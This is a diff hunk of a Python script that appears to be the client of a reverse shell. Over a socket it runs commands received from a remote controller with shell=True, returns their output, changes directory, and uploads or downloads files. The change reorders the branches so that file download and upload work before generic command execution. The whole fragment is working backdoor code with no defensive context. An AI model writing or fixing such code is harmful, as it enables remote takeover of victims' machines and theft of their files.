@@ -33,15 +33,15 @@ try:
                     s.send("[+] Changed Directory Succesfully!".encode())
                 except:
                     s.send("[-] Directory Not Found!".encode())
+            elif command[:8] == 'download':
+                download_file(s, command[9:])
+            elif command[:6] == 'upload':
+                upload_file(s, command[7:])
             elif command != "quit":
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 result = execute.stdout.read() + execute.stderr.read()
                 result = result.decode()
                 s.send(result.encode())
-            elif command[:8] == 'download':
-                download_file(s, command[9:])
-            elif command[:6] == 'upload':
-                upload_file(s, command[7:])
             else:
                 s.close()
                 break
